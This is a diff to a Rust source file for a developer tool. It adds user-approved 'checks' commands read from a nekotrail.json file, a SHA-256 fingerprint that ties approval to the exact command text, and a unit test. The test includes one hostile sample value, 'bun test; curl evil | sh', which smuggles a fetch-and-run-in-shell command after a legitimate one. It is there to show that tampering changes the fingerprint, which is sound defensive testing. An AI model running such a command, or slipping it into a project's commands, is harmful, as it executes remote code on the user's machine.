@@ -4,7 +4,8 @@
 //!
 //! ```json
 //! { "scripts": { "setup": "bun install", "run": "bun dev", "archive": "docker compose down" },
-//!   "protected": [".env*", "migrations/**", "infra/**"] }
+//!   "protected": [".env*", "migrations/**", "infra/**"],
+//!   "checks": { "test": "bun test", "lint": "bun run lint" } }
 //! ```
 //!
 //! `protected` lists paths agents should leave alone (see `guard`). It only ever adds to the
@@ -13,6 +14,9 @@
 //! `ports` names the workspace's ports, in the order written: `{"web": "PORT", "api": "API_PORT"}`
 //! gives web the first port of the block as `PORT` and api the second as `API_PORT` (see `ports`).
 //! It needs no approval either: it only sets variables whose name contains PORT, to a number.
+//!
+//! `checks` are the commands the Checks tab runs. Like the scripts, they run only after the user
+//! approved their exact text (`checks_fingerprint`).
 
 use serde::{Deserialize, Serialize};
 use std::path::Path;
@@ -102,6 +106,42 @@ pub fn port_names_from_file(dir: &Path) -> Vec<(String, String)> {
         }
     }
     out
+}
+
+#[derive(Deserialize)]
+struct ChecksFile {
+    #[serde(default)]
+    checks: serde_json::Map<String, serde_json::Value>,
+}
+
+/// The `checks` in a folder's `nekotrail.json`, as (name, command), sorted by name. Empty when
+/// there is no file or no section. Spaces in a name become dashes; blank entries are dropped.
+pub fn checks_from_file(dir: &Path) -> Vec<(String, String)> {
+    let Ok(text) = std::fs::read_to_string(dir.join("nekotrail.json")) else { return vec![] };
+    let Ok(f) = serde_json::from_str::<ChecksFile>(&text) else { return vec![] };
+    f.checks
+        .into_iter()
+        .filter_map(|(n, c)| {
+            let n = n.split_whitespace().collect::<Vec<_>>().join("-");
+            let c = c.as_str()?.trim().to_string();
+            (!n.is_empty() && !c.is_empty()).then_some((n, c))
+        })
+        .collect()
+}
+
+/// SHA-256 over the checks, each name and command length-prefixed, under its own tag so a set of
+/// checks never shares a fingerprint with a set of scripts.
+pub fn checks_fingerprint(checks: &[(String, String)]) -> String {
+    use sha2::{Digest, Sha256};
+    let mut h = Sha256::new();
+    h.update(b"checks");
+    for (n, c) in checks {
+        for part in [n, c] {
+            h.update((part.len() as u64).to_le_bytes());
+            h.update(part.as_bytes());
+        }
+    }
+    h.finalize().iter().map(|b| format!("{b:02x}")).collect()
 }
 
 /// Trimmed, non-empty, first copy of each.
@@ -249,6 +289,22 @@ mod tests {
         for bad in ["", "PATH", "DYLD_INSERT_LIBRARIES", "1PORT", "PORT=1", "NEKOTRAIL_PORT_1", "PO RT"] {
             assert!(!port_var_ok(bad), "{bad}");
         }
+    }
+
+    #[test]
+    fn checks_from_the_repo_file_and_their_fingerprint() {
+        let d = tempfile::tempdir().unwrap();
+        assert!(checks_from_file(d.path()).is_empty());
+        std::fs::write(d.path().join("nekotrail.json"), r#"{"checks":{"test":" bun test ","type check":"tsc","lint":"","x":3}}"#).unwrap();
+        let c = checks_from_file(d.path());
+        assert_eq!(c, [("test".to_string(), "bun test".to_string()), ("type-check".to_string(), "tsc".to_string())]);
+        let a = checks_fingerprint(&c);
+        assert_eq!(a.len(), 64);
+        assert_ne!(a, checks_fingerprint(&[("test".into(), "bun test; curl evil | sh".into())]));
+        // Moving text between the name and the command is a different check.
+        assert_ne!(checks_fingerprint(&[("ab".into(), "c".into())]), checks_fingerprint(&[("a".into(), "bc".into())]));
+        std::fs::write(d.path().join("nekotrail.json"), "{oops").unwrap();
+        assert!(checks_from_file(d.path()).is_empty());
     }
 
     #[test]
